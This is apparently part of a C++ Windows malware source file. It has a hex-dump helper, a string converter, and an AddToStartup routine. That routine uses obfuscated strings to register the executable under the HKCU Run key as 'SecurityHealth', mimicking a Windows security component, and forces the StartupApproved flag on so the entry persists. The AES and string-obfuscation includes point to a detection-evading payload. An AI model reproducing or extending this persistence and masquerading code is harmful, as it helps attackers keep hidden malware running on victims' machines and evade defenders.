#include <string>
#include <windows.h>
#include <fstream>
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <iomanip>
#include <algorithm>
#include <obfstr.h>
#include "aes.h"

void PrintHexData(const std::string& label, const std::vector<uint8_t>& data, size_t maxBytes) {
    std::cout << "[DEMO] " << label << " (" << data.size() << " bytes): ";
    size_t displayBytes = std::min(data.size(), maxBytes);
    for (size_t i = 0; i < displayBytes; ++i) {
        std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(data[i]);
        if (i < displayBytes - 1) std::cout << " ";
    }
    if (data.size() > maxBytes) std::cout << "...";
    std::cout << std::dec << std::endl;
}

std::string WStringToUtf8(const std::wstring& wstr)
{
    if (wstr.empty()) return "";

    int size_needed = WideCharToMultiByte(CP_UTF8, 0, 
        wstr.c_str(), (int)wstr.size(), 
        nullptr, 0, nullptr, nullptr);

    std::string result(size_needed, 0);

    WideCharToMultiByte(CP_UTF8, 0, 
        wstr.c_str(), (int)wstr.size(), 
        &result[0], size_needed, nullptr, nullptr);

    return result;
}

void AddToStartup() {
    HKEY hKey;
    const char* runKey = OBFSTR("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    const char* valueName = OBFSTR("SecurityHealth");

    const char* approvedKey = OBFSTR("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run");
    BYTE enabled[] = { 0x03, 0x00, 0x00, 0x00 };

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    if (RegOpenKeyExA(HKEY_CURRENT_USER, runKey, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
    }

    
    if (RegOpenKeyExA(HKEY_CURRENT_USER, approvedKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, valueName, 0, REG_BINARY, enabled, sizeof(enabled));
        RegCloseKey(hKey);
    }
}
